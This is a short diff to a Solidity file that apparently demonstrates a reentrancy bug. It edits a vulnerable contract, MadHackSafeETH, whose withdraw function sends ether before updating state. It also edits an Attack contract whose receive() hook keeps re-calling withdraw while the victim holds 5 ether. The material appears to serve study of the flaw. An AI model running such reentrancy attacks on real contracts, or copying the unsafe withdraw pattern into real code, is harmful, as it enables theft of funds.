@@ -37,6 +37,7 @@ contract MadHackSafeETH {
     uint256 public passThrough;
 
     address[] public payees;
+    uint256[] public shares = [5, 5];
 
     function withdraw(address recipient) external {
         // uint256 len = splitter.payeesLength(); // public callable
@@ -46,7 +47,7 @@ contract MadHackSafeETH {
         uint256 _val;
         if (feeCount > 0 && recipient != address(0)) {
             _val = address(this).balance - feeCount;
-            safeTransferETH(payable(recipient), feeCount); // re-nter here
+            safeTransferETH(payable(recipient), feeCount); // re-enter here
             feeCount = 0;
         } else {
             _val = address(this).balance;
@@ -60,7 +61,7 @@ contract MadHackSafeETH {
             // address addr = splitter._payees(i); // public callable
             // uint256 share = splitter._shares(addr);
             address addr = payees[i];
-            uint256 share = 5;
+            uint256 share = shares[i];
             addrs[i] = addr;
             values[i] = ((_val * (share * 1e2)) / 10_000);
             unchecked {
@@ -69,7 +70,7 @@ contract MadHackSafeETH {
         }
         uint256 j;
         while (j < len) {
-            safeTransferETH(addrs[j], values[j]); // re-enter here.
+            safeTransferETH(addrs[j], values[j]); // re-entry here is also possible for an attack from a 'payee'.
             unchecked {
                 ++j;
             }
@@ -89,7 +90,7 @@ contract Attack {
     }
 
     receive() external payable {
-        if (address(madHackSafeETH).balance >= (startBalance - (startBalance / 2))) {
+        if (address(madHackSafeETH).balance >= 5 ether) {
             madHackSafeETH.withdraw(address(this));
         }
         // madHackSafeETH.getBalance();
